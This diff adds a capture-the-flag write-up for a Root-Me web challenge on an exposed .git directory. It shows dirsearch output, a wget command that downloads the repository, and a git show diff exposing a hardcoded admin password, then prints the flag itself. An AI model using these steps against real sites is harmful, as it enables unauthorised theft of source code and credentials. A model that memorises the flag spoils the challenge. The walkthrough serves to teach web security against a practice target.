@@ -1,0 +1,99 @@
+---
+tags: [web]
+---
+# Insecure Code Management
+
+- **Description:** Get the password (in clear text) from the admin account.
+- **Difficulty:** Easy
+
+---
+
+## 🔎 Solution
+When accessing the website, we are presented with a login page, but no credentials are provided.
+
+Using `dirsearch` to enumerate hidden paths, we discover several endpoints related to Git.
+```
+> dirsearch  -u http://challenge01.root-me.org/web-serveur/ch61/
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
+ (_||| _) (/_(_|| (_| )                                                                                             
+                                                                                                                    
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_challenge01.root-me.org/_web-serveur_ch61__26-02-21_05-28-00.txt
+
+Target: http://challenge01.root-me.org/
+
+[05:28:00] Starting: web-serveur/ch61/                                                                              
+[05:28:05] 403 -  548B  - /web-serveur/ch61/%2e%2e;/test
+//highlight-next-line
+[05:28:10] 301 -  162B  - /web-serveur/ch61/.git  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/
+[05:28:10] 200 -  197B  - /web-serveur/ch61/.git/branches/                  
+[05:28:10] 200 -    1KB - /web-serveur/ch61/.git/
+[05:28:10] 200 -  352B  - /web-serveur/ch61/.git/COMMIT_EDITMSG
+[05:28:10] 200 -   92B  - /web-serveur/ch61/.git/config
+[05:28:10] 200 -   73B  - /web-serveur/ch61/.git/description
+[05:28:10] 200 -   23B  - /web-serveur/ch61/.git/HEAD                       
+[05:28:10] 200 -    1KB - /web-serveur/ch61/.git/hooks/                     
+[05:28:10] 200 -  523B  - /web-serveur/ch61/.git/index                      
+[05:28:10] 200 -  301B  - /web-serveur/ch61/.git/info/
+[05:28:10] 200 -  797B  - /web-serveur/ch61/.git/logs/HEAD                  
+[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/logs/refs  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/logs/refs/
+[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/logs/refs/heads  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/logs/refs/heads/
+[05:28:10] 200 -  797B  - /web-serveur/ch61/.git/logs/refs/heads/master
+[05:28:10] 200 -  240B  - /web-serveur/ch61/.git/info/exclude               
+[05:28:10] 200 -  408B  - /web-serveur/ch61/.git/logs/                      
+[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/refs/tags  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/refs/tags/
+[05:28:10] 200 -    3KB - /web-serveur/ch61/.git/objects/                   
+[05:28:10] 200 -  410B  - /web-serveur/ch61/.git/refs/                      
+[05:28:10] 301 -  162B  - /web-serveur/ch61/.git/refs/heads  ->  http://challenge01.root-me.org/web-serveur/ch61/.git/refs/heads/
+[05:28:10] 200 -   41B  - /web-serveur/ch61/.git/refs/heads/master
+```
+
+For projects using Git, running `git init` or `git clone` creates a `.git` directory, which stores all version control data of the project. 
+Since this directory is publicly accessible, we can download it entirely.
+```
+wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/
+```
+
+After downloading, the directory structure looks like this:
+```
+> ls -a 
+.  ..  branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  index.html  info  logs  objects  refs
+```
+
+By using `git show` to inspect the most recent commit, we can see the code changes. 
+The old password revealed in this commit is the flag for the challenge.
+```
+> git show
+commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
+Author: John <john@bs-corp.com>
+Date:   Fri Sep 27 20:10:05 2019 +0200
+
+    blue team want sha256!!!!!!!!!
+
+diff --git a/config.php b/config.php
+index e11aad2..663fe35 100644
+--- a/config.php
++++ b/config.php
+@@ -1,3 +1,3 @@
+ <?php
+        $username = "admin";
+//highlight-next-line
+-       $password = "s3cureP@ssw0rd";
++       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
+diff --git a/index.php b/index.php
+index f7237d0..2e620c1 100755
+--- a/index.php
++++ b/index.php
+@@ -13,7 +13,7 @@
+                <?php
+                        include('./config.php');
+                        if(isset($_POST['username']) && isset($_POST['password'])){
+-                               if ($_POST['username'] == $username && md5($_POST['password']) == md5($password)){
++                               if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password){
+                                        echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
+                                        echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
+```
+
+## 🚩Flag
+> `s3cureP@ssw0rd`
